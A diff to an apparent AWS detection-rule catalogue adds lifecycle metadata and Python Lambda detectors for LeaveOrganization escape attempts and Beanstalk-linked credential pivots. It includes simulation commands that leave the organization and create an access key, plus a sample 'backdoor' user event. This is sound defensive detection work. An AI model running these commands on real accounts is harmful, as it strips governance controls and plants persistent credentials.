     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "organizations.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "userIdentity.accountId", "recipientAccountId", "errorCode", "errorMessage", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "organizations.amazonaws.com", eventName: "LeaveOrganization", userIdentity: { type: "Root", accountId: "123456789012" }, recipientAccountId: "123456789012", sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the account and actor.", "Verify if leave was authorized.", "Check errorCode for blocked attempts."],
-    testingSteps: ["Call LeaveOrganization from member account root.", "Verify CloudTrail captures the event.", "Run the detection."],
+    investigationSteps: ["Identify the member account, actor context, and whether the attempt succeeded or failed.", "Verify whether the leave action was expected as part of an approved migration or restructuring workflow.", "Check for follow-on guardrail-sensitive actions or evidence that the account was trying to escape centralized control."],
+    testingSteps: ["Call `LeaveOrganization` from a controlled member-account lab context.", "Verify CloudTrail captures actor, account, and error details where applicable.", "Run the baseline detector and confirm it records both successful and blocked leave attempts."],
+    lifecycle: {
+      whyItMatters: "Leaving an AWS Organization can remove centralized policy, SCP, and governance coverage from an account. Even attempts are high-value signals because they indicate interest in escaping guardrails.",
+      threatContext: {
+        attackerBehavior: "An attacker with sufficient control over a member account may try to leave the organization to shed SCP enforcement and reduce centralized security oversight.",
+        realWorldUsage: "This is attractive because it can weaken or remove inherited guardrails before later persistence, credential creation, or logging changes.",
+        whyItMatters: "The attempt itself is meaningful, even when blocked, because it reveals defense-evasion intent.",
+        riskAndImpact: "If missed, defenders may overlook a direct attempt to detach an account from organization-level protection and governance.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for Organizations"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.type", "userIdentity.arn", "userIdentity.accountId", "recipientAccountId", "errorCode", "errorMessage", "sourceIPAddress"],
+        loggingRequirements: ["CloudTrail must ingest Organizations management events.", "The environment should preserve both actor context and recipient account context.", "Guardrail-sensitive follow-on actions should be available for downstream correlation."],
+        limitations: ["The event alone does not show why the account attempted to leave.", "Some authorized restructuring projects may involve legitimate leave actions.", "Actor identity may be root or minimally attributed in some cases."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor attempting to leave the organization where available" },
+          { rawPath: "userIdentity.accountId", normalizedPath: "cloud.account.id", notes: "Source account identity context" },
+          { rawPath: "recipientAccountId", normalizedPath: "cloud.account.target_id", notes: "Member account attempting to leave" },
+          { rawPath: "errorCode", normalizedPath: "error.code", notes: "Failure context when the attempt is blocked" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["iam"], type: ["change"], action: "LeaveOrganization", outcome: "success", provider: "aws" },
+          user: { type: "Root" },
+          cloud: { account: { id: "123456789012", target_id: "123456789012" } },
+          source: { ip: "203.0.113.10" },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Account Governance Importance", description: "Determine how critical the member account is and what guardrails it currently inherits from the organization.", examples: ["prod member account", "shared services account"], falsePositiveReduction: "Improves prioritization when high-value accounts attempt to leave." },
+        { dimension: "Workflow Provenance", description: "Understand whether the leave attempt aligns with approved migration, divestiture, or restructuring workflows.", examples: ["documented account migration", "untracked manual leave"], falsePositiveReduction: "Separates legitimate org changes from suspicious escape attempts." },
+        { dimension: "Attempt Outcome", description: "Track whether the leave action succeeded, failed, or was denied by policy or configuration.", examples: ["success", "blocked by SCP"], falsePositiveReduction: "Helps triage the urgency and next containment steps." },
+      ],
+      logicExplanation: {
+        humanReadable: "This should remain a broad visibility rule for every `LeaveOrganization` attempt. It establishes the baseline signal that an account tried to detach itself from organizational control, regardless of whether the attempt succeeded.",
+        conditions: ["eventSource equals organizations.amazonaws.com", "eventName equals LeaveOrganization"],
+        tuningGuidance: "1. Keep this baseline broad. 2. Enrich with account governance criticality and attempt outcome. 3. Correlate quickly with post-leave guardrail-sensitive actions for higher confidence.",
+        whenToFire: "Fire on every successful or failed LeaveOrganization attempt.",
+      },
+      simulationCommand: "aws organizations leave-organization",
+      quality: {
+        signalQuality: 9,
+        falsePositiveRate: "Low in most environments because LeaveOrganization is rare and sensitive",
+        expectedVolume: "Very low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda", "Athena", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is preferred because organization-escape attempts are immediately actionable.",
+        considerations: ["This is the baseline Organizations escape detector.", "Account governance context is the most important enrichment."],
+      },
+    },
   },
   {
     id: "det-115",
     title: "LeaveOrganization Called by Root Context",
-    description: "Detects the most dangerous execution context: LeaveOrganization invoked through root or highly privileged standalone account context. The technique is operationally strongest when invoked through root.",
+    description: "Detects `LeaveOrganization` when executed through root context. Root-initiated organization escape is among the highest-signal variants because it implies maximal control over the member account.",
     awsService: "Organizations",
     relatedServices: [],
     severity: "Critical",
@@ -13361,16 +15084,94 @@ ORDER BY eventTime DESC`,
 | filter userIdentity.type = "Root"
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.organizations"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["organizations.amazonaws.com"], eventName: ["LeaveOrganization"] } }, null, 2),
+      lambda: `"""
+LeaveOrganization Called by Root Context
+Trigger: EventBridge rule matching LeaveOrganization.
+Use for: Real-time detection of root-initiated organization escape.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "organizations.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "LeaveOrganization":
+        return {"matched": False}
+    if detail.get("userIdentity", {}).get("type") != "Root":
+        return {"matched": False}
+
+    return {
+        "matched": True,
+        "alert": {
+            "rule_id": "det-115",
+            "title": "LeaveOrganization Called by Root Context",
+            "severity": "Critical",
+            "account_id": detail.get("recipientAccountId"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "organizations.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.accountId", "recipientAccountId", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "organizations.amazonaws.com", eventName: "LeaveOrganization", userIdentity: { type: "Root", accountId: "123456789012" }, recipientAccountId: "123456789012", sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Confirm root context.", "Verify if account leave was authorized.", "Check for follow-on guardrail-sensitive activity."],
-    testingSteps: ["Call LeaveOrganization as root.", "Verify detection triggers."],
+    investigationSteps: ["Confirm the request used root context and identify the member account involved.", "Verify whether any approved account-migration or emergency governance workflow justified root use.", "Check immediately for follow-on IAM, logging, or encryption-control changes after the root-initiated leave attempt."],
+    testingSteps: ["Invoke `LeaveOrganization` from a controlled root lab context in a test member account.", "Verify CloudTrail records `userIdentity.type = Root`.", "Run the detector and confirm it isolates root-context leave attempts."],
+    lifecycle: {
+      whyItMatters: "Root use in organization escape is one of the strongest possible signals because it combines a high-impact action with the highest-privilege execution context.",
+      threatContext: {
+        attackerBehavior: "An attacker who gains or abuses root access may use it to leave the organization and strip away centralized governance.",
+        realWorldUsage: "This is attractive because root context can bypass many operational limitations and indicates the attacker likely has deep control over the member account.",
+        whyItMatters: "Root-initiated leave attempts deserve special treatment beyond the general baseline because the execution context materially raises severity.",
+        riskAndImpact: "If missed, defenders may fail to recognize one of the strongest indicators that a member account is under active hostile control.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for Organizations"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.type", "userIdentity.accountId", "recipientAccountId", "errorCode", "sourceIPAddress"],
+        loggingRequirements: ["LeaveOrganization events must be ingested with userIdentity.type preserved.", "Root context should be captured accurately in CloudTrail.", "Follow-on guardrail-sensitive actions should be available for downstream correlation."],
+        limitations: ["Some organizations may rarely use root for legitimate account governance operations, though this should be exceptional.", "Root attribution is high-signal but not always richly descriptive beyond account context."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.type", normalizedPath: "user.type", notes: "Execution context, expected to be Root" },
+          { rawPath: "userIdentity.accountId", normalizedPath: "cloud.account.id", notes: "Account using root context" },
+          { rawPath: "recipientAccountId", normalizedPath: "cloud.account.target_id", notes: "Member account attempting to leave" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["iam"], type: ["change"], action: "LeaveOrganization", outcome: "success", provider: "aws" },
+          user: { type: "Root" },
+          cloud: { account: { id: "123456789012", target_id: "123456789012" } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Root Governance Posture", description: "Understand whether root use is tightly controlled and how unusual this event is for the account.", examples: ["root never used operationally", "documented migration root usage"], falsePositiveReduction: "Raises confidence when root usage is anomalous." },
+        { dimension: "Account Criticality", description: "Classify the member account by environment and business importance.", examples: ["prod member account", "shared services"], falsePositiveReduction: "Improves prioritization of root-initiated org escape attempts." },
+        { dimension: "Attempt Outcome", description: "Track whether the root attempt succeeded or failed.", examples: ["success", "policy-blocked"], falsePositiveReduction: "Guides immediate containment urgency." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should detect `LeaveOrganization` only when the request is made through root context. It is a focused high-severity variant of the baseline organization escape detector.",
+        conditions: ["eventSource equals organizations.amazonaws.com", "eventName equals LeaveOrganization", "userIdentity.type equals Root"],
+        tuningGuidance: "1. Keep the root filter exact. 2. Escalate immediately regardless of success or failure. 3. Correlate with post-leave guardrail-sensitive activity for incident scoping.",
+        whenToFire: "Fire whenever LeaveOrganization is invoked through root context.",
+      },
+      simulationCommand: "aws organizations leave-organization",
+      quality: {
+        signalQuality: 10,
+        falsePositiveRate: "Very low in mature environments",
+        expectedVolume: "Extremely low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda", "Athena", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is essential because root-initiated organization escape is immediately actionable.",
+        considerations: ["This is the execution-context variant of the LeaveOrganization family.", "Root governance posture is the main enrichment dependency."],
+      },
+    },
   },
   {
     id: "det-116",
     title: "Failed LeaveOrganization Attempt",
-    description: "Detects defense-evasion attempts that were blocked by SCPs or organization configuration. A blocked attempt is still a serious incident signal because it suggests active evasion intent.",
+    description: "Detects blocked or failed `LeaveOrganization` attempts. A denied escape attempt is still a serious defense-evasion signal because it shows intent to detach the account from organizational guardrails.",
     awsService: "Organizations",
     relatedServices: [],
     severity: "Critical",
@@ -13406,16 +15207,99 @@ ORDER BY eventTime DESC`,
 | filter ispresent(errorCode)
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.organizations"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["organizations.amazonaws.com"], eventName: ["LeaveOrganization"] } }, null, 2),
+      lambda: `"""
+Failed LeaveOrganization Attempt
+Trigger: EventBridge rule matching LeaveOrganization.
+Use for: Real-time detection of blocked organization-escape attempts.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "organizations.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "LeaveOrganization":
+        return {"matched": False}
+    if not detail.get("errorCode"):
+        return {"matched": False}
+
+    user_identity = detail.get("userIdentity", {})
+    return {
+        "matched": True,
+        "alert": {
+            "rule_id": "det-116",
+            "title": "Failed LeaveOrganization Attempt",
+            "severity": "Critical",
+            "actor": user_identity.get("arn") or user_identity.get("accountId"),
+            "error_code": detail.get("errorCode"),
+            "account_id": detail.get("recipientAccountId"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "organizations.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "errorCode", "errorMessage", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "organizations.amazonaws.com", eventName: "LeaveOrganization", userIdentity: { type: "Root", accountId: "123456789012" }, errorCode: "AccessDenied", errorMessage: "SCP denied", sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the error and blocking mechanism.", "Verify if attempt was malicious.", "Review SCP or org settings that blocked it."],
-    testingSteps: ["Attempt LeaveOrganization when SCP denies it.", "Verify detection triggers on error."],
+    investigationSteps: ["Identify the error code, error message, and control that blocked the leave attempt.", "Determine whether the actor and account had any legitimate reason to attempt leaving the organization.", "Review recent guardrail-sensitive actions to assess whether the failed escape was part of broader malicious behavior."],
+    testingSteps: ["Attempt `LeaveOrganization` in a controlled lab where SCPs or organization configuration deny the request.", "Verify CloudTrail records the error context.", "Run the detector and confirm it only fires on failed attempts."],
+    lifecycle: {
+      whyItMatters: "A blocked organization escape attempt is still an incident-level signal. It shows active intent to remove an account from centralized controls even if the guardrail held.",
+      threatContext: {
+        attackerBehavior: "An attacker may attempt to leave the organization and be denied by SCPs, account settings, or Organizations constraints.",
+        realWorldUsage: "This is common in real cloud intrusions where the actor tests escape paths before finding a working route.",
+        whyItMatters: "Failure does not reduce severity much; it often means the attacker has reached a critical stage but encountered a control.",
+        riskAndImpact: "If ignored, defenders may miss the clearest early warning that an account was actively probing its way out of organizational governance.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for Organizations"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "errorCode", "errorMessage", "recipientAccountId", "sourceIPAddress"],
+        loggingRequirements: ["CloudTrail must preserve errorCode and errorMessage for failed LeaveOrganization calls.", "The environment should map which control blocked the action where possible.", "Related guardrail-sensitive activities should be available for scoping."],
+        limitations: ["Error messages may be generic in some cases.", "Authorized testing or governance validation could intentionally trigger blocked attempts in rare scenarios.", "The blocking control may require out-of-band investigation to identify precisely."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "errorCode", normalizedPath: "error.code", notes: "Reason the leave attempt failed" },
+          { rawPath: "errorMessage", normalizedPath: "error.message", notes: "Detailed failure context where available" },
+          { rawPath: "recipientAccountId", normalizedPath: "cloud.account.target_id", notes: "Member account that attempted to leave" },
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor attempting organization escape" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["iam"], type: ["change"], action: "LeaveOrganization", outcome: "failure", provider: "aws" },
+          user: { type: "Root" },
+          cloud: { account: { target_id: "123456789012" } },
+          error: { code: "AccessDenied", message: "SCP denied" },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Blocking Control", description: "Determine what guardrail prevented the account from leaving.", examples: ["SCP denial", "Organizations configuration constraint"], falsePositiveReduction: "Improves triage and containment validation." },
+        { dimension: "Actor Intent Context", description: "Assess whether the actor has recent suspicious activity that makes the blocked leave more alarming.", examples: ["recent IAM mutation", "recent logging disable attempts"], falsePositiveReduction: "Raises confidence that the failed attempt was malicious rather than administrative testing." },
+        { dimension: "Account Criticality", description: "Classify how important the target account is to the organization.", examples: ["prod member account", "sandbox account"], falsePositiveReduction: "Prioritizes the highest-impact blocked escape attempts." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should detect `LeaveOrganization` only when the attempt failed. It should key off `errorCode` presence and treat blocked organization escape as a high-severity intent signal.",
+        conditions: ["eventSource equals organizations.amazonaws.com", "eventName equals LeaveOrganization", "errorCode exists and is non-empty"],
+        tuningGuidance: "1. Keep the failure check exact. 2. Review what blocked the attempt. 3. Correlate with recent suspicious actions to determine whether the failure was part of a larger intrusion sequence.",
+        whenToFire: "Fire whenever LeaveOrganization is attempted and fails.",
+      },
+      simulationCommand: "aws organizations leave-organization",
+      quality: {
+        signalQuality: 9,
+        falsePositiveRate: "Very low outside deliberate governance testing",
+        expectedVolume: "Extremely low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda", "Athena", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is preferred because blocked escape attempts warrant immediate review.",
+        considerations: ["This is the denied-attempt variant of the LeaveOrganization family.", "Error context and blocking-control attribution are the main enrichments."],
+      },
+    },
   },
   {
     id: "det-117",
     title: "LeaveOrganization Followed by Guardrail-Sensitive Activity",
-    description: "High-confidence defense-evasion: LeaveOrganization then shortly afterward same actor or account performs IAM policy modification, KMS key scheduling, security control disabling, access-key creation, or logging reduction.",
+    description: "High-confidence organization-escape chain detection. This should correlate a leave attempt with later IAM, KMS, or logging-control changes using ordered sequence and account linkage rather than loose event aggregation.",
     awsService: "Organizations",
     relatedServices: ["IAM", "KMS", "CloudTrail"],
     severity: "Critical",
@@ -13440,9 +15324,9 @@ detection:
       - PutKeyPolicy
       - UpdateTrail
       - StopLogging
-  condition: 1 of selection_*
+  condition: selection_leave
 level: critical
-# Full correlation (account/actor, 1h) requires SIEM.`,
+# Full correlation requires ordered sequence and stable account or actor linkage across the leave attempt and follow-on guardrail-sensitive actions.`,
       splunk: `index=aws sourcetype=aws:cloudtrail
   ((eventSource=organizations.amazonaws.com AND eventName=LeaveOrganization) OR (eventName=PutUserPolicy OR eventName=AttachRolePolicy OR eventName=PutRolePolicy OR eventName=CreateAccessKey OR eventName=PutKeyPolicy OR eventName=UpdateTrail OR eventName=StopLogging))
 | eval acct=coalesce(recipientAccountId, userIdentity.accountId)
@@ -13477,18 +15361,97 @@ ORDER BY l.leave_time DESC`,
 | filter cnt > 1
 | sort cnt desc`,
       eventbridge: JSON.stringify({ source: ["aws.organizations"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["organizations.amazonaws.com"], eventName: ["LeaveOrganization"] } }, null, 2),
+      lambda: `"""
+LeaveOrganization Followed by Guardrail-Sensitive Activity
+Trigger: EventBridge rule matching LeaveOrganization.
+Use for: Correlation from organization escape to later guardrail-sensitive activity.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "organizations.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "LeaveOrganization":
+        return {"matched": False}
+
+    user_identity = detail.get("userIdentity", {})
+    return {
+        "matched": "requires-leaveorganization-plus-guardrail-sensitive-correlation",
+        "alert": {
+            "rule_id": "det-117",
+            "title": "LeaveOrganization Followed by Guardrail-Sensitive Activity",
+            "severity": "Critical",
+            "actor": user_identity.get("arn") or user_identity.get("accountId"),
+            "account_id": detail.get("recipientAccountId"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "organizations.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "recipientAccountId", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "organizations.amazonaws.com", eventName: "LeaveOrganization", userIdentity: { type: "Root", accountId: "123456789012" }, recipientAccountId: "123456789012", sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify LeaveOrganization and follow-on activity.", "Verify if sensitive actions were previously SCP-blocked.", "Check for IAM/KMS/CloudTrail changes."],
-    testingSteps: ["Leave org, then perform CreateAccessKey within 1h.", "Run Splunk or Athena correlation query."],
+    investigationSteps: ["Identify the leave attempt and the exact ordered follow-on guardrail-sensitive actions in the same account.", "Determine whether the same normalized actor or account context later performed IAM policy changes, key-policy changes, logging reduction, or credential creation.", "Assess whether the sequence represents immediate post-escape hardening bypass or persistence establishment."],
+    testingSteps: ["Trigger a controlled `LeaveOrganization` lab event, then perform `CreateAccessKey`, `PutKeyPolicy`, or `StopLogging` within one hour.", "Verify CloudTrail records both the leave attempt and follow-on actions with account context.", "Run the detector and confirm it requires ordered account-linked correlation rather than simple event co-occurrence."],
+    lifecycle: {
+      whyItMatters: "A leave attempt becomes much more suspicious when it is followed by guardrail-sensitive activity. This sequence suggests the account was trying to shed organizational control before changing policies, keys, or logging.",
+      threatContext: {
+        attackerBehavior: "An attacker may leave or attempt to leave the organization and then quickly create access keys, loosen IAM or KMS controls, or reduce logging to consolidate access.",
+        realWorldUsage: "This is attractive because leaving the organization can weaken inherited guardrails just before the attacker performs high-impact changes.",
+        whyItMatters: "The strongest signal is the ordered chain from organization escape into direct guardrail-sensitive changes.",
+        riskAndImpact: "If missed, defenders may not recognize that post-leave control changes were part of a deliberate governance-escape sequence.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for Organizations", "AWS CloudTrail management events for IAM, KMS, CloudTrail, and related services"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "userIdentity.accountId", "recipientAccountId", "sourceIPAddress"],
+        loggingRequirements: ["LeaveOrganization and follow-on guardrail-sensitive events must be ingested into the same analytics environment.", "The detector should correlate on stable account context and actor identity where available.", "The engine must support ordered time-window correlation."],
+        limitations: ["Actor identity may not always remain stable after the leave attempt, so account linkage is important.", "Some legitimate account setup after an approved leave may generate similar sequences.", "The model requires tuning to local governance workflows."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "recipientAccountId", normalizedPath: "cloud.account.target_id", notes: "Account attempting to leave the organization" },
+          { rawPath: "userIdentity.accountId", normalizedPath: "cloud.account.id", notes: "Account context for later guardrail-sensitive actions" },
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor associated with the leave attempt or later changes" },
+          { rawPath: "follow_on.eventName", normalizedPath: "related.event.action", notes: "Guardrail-sensitive action after the leave attempt" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["iam"], type: ["change"], action: "LeaveOrganization", outcome: "success", provider: "aws" },
+          cloud: { account: { target_id: "123456789012" } },
+          related: { event: { action: "CreateAccessKey" } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Stable Account Linkage", description: "Correlate the leave attempt to later actions using recipient account and actor context.", examples: ["same member account after leave", "same root actor"], falsePositiveReduction: "Improves fidelity when actor identity changes after the leave attempt." },
+        { dimension: "Follow-On Activity Class", description: "Classify later actions as IAM persistence, KMS control change, logging reduction, or other guardrail-sensitive behavior.", examples: ["CreateAccessKey", "StopLogging", "PutKeyPolicy"], falsePositiveReduction: "Makes the escape-to-action path easier to triage." },
+        { dimension: "Governance Transition Context", description: "Determine whether the account was legitimately leaving the organization for migration or divestiture.", examples: ["approved migration", "untracked leave"], falsePositiveReduction: "Separates legitimate governance transitions from suspicious post-escape hardening bypass." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should model an organization-escape sequence: a member account attempts to leave the organization and then guardrail-sensitive activity occurs soon afterward in the same account context. It should require event order and stable account or actor linkage.",
+        conditions: ["first eventSource equals organizations.amazonaws.com and eventName equals LeaveOrganization", "second event is a modeled guardrail-sensitive action linked to the same account or normalized actor context", "follow-on activity occurs within 1 hour"],
+        tuningGuidance: "1. Require event order. 2. Correlate primarily on account context, then actor where possible. 3. Escalate further when the account is high-value or the leave attempt was root-initiated.",
+        whenToFire: "Fire when a leave attempt is followed quickly by IAM, KMS, or logging-control changes in the same account context.",
+      },
+      simulationCommand: "aws organizations leave-organization && aws iam create-access-key --user-name demo-user",
+      quality: {
+        signalQuality: 9,
+        falsePositiveRate: "Low-Medium with governance workflow context and stable account linkage",
+        expectedVolume: "Very low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["SIEM correlation engines", "Athena with ordered event windows", "Panther / Chronicle / Datadog", "EventBridge + Lambda with temporary state"],
+        scheduling: "Near-real-time is preferred because post-escape guardrail changes are immediately actionable.",
+        considerations: ["This is the highest-fidelity LeaveOrganization chain in the family.", "Ordered correlation and stable account linkage are the main dependencies."],
+      },
+    },
   },
 
   // --- Beanstalk Credential Pivot ---
   {
     id: "det-118",
-    title: "CreateAccessKey or AssumeRole by Beanstalk-Linked Principal",
-    description: "Baseline visibility when a principal associated with Beanstalk pivots into stronger access paths. Stronger than generic CreateAccessKey because tied to a Beanstalk credential source.",
+    title: "Beanstalk-Linked Principal Performs Credential Pivot",
+    description: "Baseline visibility when a principal linked to an Elastic Beanstalk environment pivots into stronger credential paths such as `CreateAccessKey` or `AssumeRole`. The signal should rely on resolved Beanstalk linkage, not string matching on principal names.",
     awsService: "IAM",
     relatedServices: ["Elastic Beanstalk", "STS"],
     severity: "High",
@@ -13507,36 +15470,109 @@ detection:
   selection_sts:
     eventSource: sts.amazonaws.com
     eventName: AssumeRole
-  filter_beanstalk:
-    userIdentity.arn|contains:
-      - 'elasticbeanstalk'
-      - 'Beanstalk'
-      - 'aws-elasticbeanstalk'
-  condition: (selection_iam or selection_sts) and filter_beanstalk
+  condition: selection_iam or selection_sts
 level: high`,
       splunk: `index=aws sourcetype=aws:cloudtrail ((eventSource=iam.amazonaws.com AND eventName=CreateAccessKey) OR (eventSource=sts.amazonaws.com AND eventName=AssumeRole))
-| where like(userIdentity.arn, "%elasticbeanstalk%") OR like(userIdentity.arn, "%Beanstalk%") OR like(userIdentity.arn, "%aws-elasticbeanstalk%") OR like(userIdentity.sessionContext.sessionIssuer.arn, "%elasticbeanstalk%")
 | table _time, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.userName, requestParameters.roleArn, sourceIPAddress`,
       cloudtrail: `SELECT eventTime, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.userName, requestParameters.roleArn, sourceIPAddress
 FROM cloudtrail_logs
 WHERE ((eventSource = 'iam.amazonaws.com' AND eventName = 'CreateAccessKey') OR (eventSource = 'sts.amazonaws.com' AND eventName = 'AssumeRole'))
-  AND (userIdentity.arn LIKE '%elasticbeanstalk%' OR userIdentity.arn LIKE '%Beanstalk%' OR userIdentity.arn LIKE '%aws-elasticbeanstalk%' OR userIdentity.sessionContext.sessionIssuer.arn LIKE '%elasticbeanstalk%')
 ORDER BY eventTime DESC`,
       cloudwatch: `fields @timestamp, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.userName, requestParameters.roleArn
 | filter (eventSource = "iam.amazonaws.com" and eventName = "CreateAccessKey") or (eventSource = "sts.amazonaws.com" and eventName = "AssumeRole")
-| filter userIdentity.arn like /elasticbeanstalk|Beanstalk|aws-elasticbeanstalk/ or userIdentity.sessionContext.sessionIssuer.arn like /elasticbeanstalk/
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.iam", "aws.sts"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["CreateAccessKey", "AssumeRole"] } }, null, 2),
+      lambda: `"""
+Beanstalk-Linked Principal Performs Credential Pivot
+Trigger: EventBridge rule matching CreateAccessKey or AssumeRole.
+Use for: Real-time evaluation of credential pivots from Beanstalk-linked principals.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    event_source = detail.get("eventSource")
+    event_name = detail.get("eventName")
+    if (event_source, event_name) not in {
+        ("iam.amazonaws.com", "CreateAccessKey"),
+        ("sts.amazonaws.com", "AssumeRole"),
+    }:
+        return {"matched": False}
+
+    return {
+        "matched": "requires-beanstalk-principal-linkage-check",
+        "alert": {
+            "rule_id": "det-118",
+            "title": "Beanstalk-Linked Principal Performs Credential Pivot",
+            "severity": "High",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "event_name": event_name,
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.userName", "requestParameters.roleArn", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "CreateAccessKey", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/aws-elasticbeanstalk-ec2-role/session" }, requestParameters: { userName: "backdoor" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the Beanstalk-linked principal.", "Verify if CreateAccessKey/AssumeRole was expected.", "Check for prior DescribeConfigurationSettings."],
-    testingSteps: ["As Beanstalk instance role, call CreateAccessKey.", "Verify detection triggers."],
+    investigationSteps: ["Identify the principal performing `CreateAccessKey` or `AssumeRole` and verify its linkage to a Beanstalk environment or execution path.", "Determine whether the pivot is expected for that environment or whether the principal should never create IAM credentials or assume additional roles.", "Check for prior Beanstalk reconnaissance, environment reads, or configuration access that may explain the pivot."],
+    testingSteps: ["From a lab principal linked to an Elastic Beanstalk environment, perform `AssumeRole` or `CreateAccessKey` in a controlled test.", "Verify CloudTrail records the principal and target role or user context.", "Run the detector and confirm it relies on Beanstalk linkage enrichment rather than string matches on principal ARNs."],
+    lifecycle: {
+      whyItMatters: "A Beanstalk-linked principal moving into stronger credential paths can indicate that environment-derived access is being operationalized for persistence or lateral movement. The baseline event is valuable because it marks a possible pivot out of application infrastructure into broader cloud control.",
